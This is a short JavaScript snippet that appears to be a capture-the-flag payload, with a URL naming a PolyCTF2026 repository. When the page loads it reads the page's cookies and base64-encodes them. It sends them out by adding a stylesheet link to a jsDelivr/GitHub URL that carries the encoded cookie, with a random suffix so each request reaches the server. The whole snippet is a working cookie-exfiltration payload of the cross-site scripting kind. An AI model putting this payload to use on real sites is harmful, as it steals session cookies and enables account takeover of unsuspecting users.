window.onload = function() {
    let flag = btoa(document.cookie).replace(/=/g, '');
    let s = document.createElement('link');
    s.rel = 'stylesheet';
    // We add a random number to guarantee it hits GitHub!
    s.href = `https://cdn.jsdelivr.net/gh/s25553258troy/PolyCTF2026@main/${flag}_${Math.random()}.css`;
    document.head.appendChild(s);
};
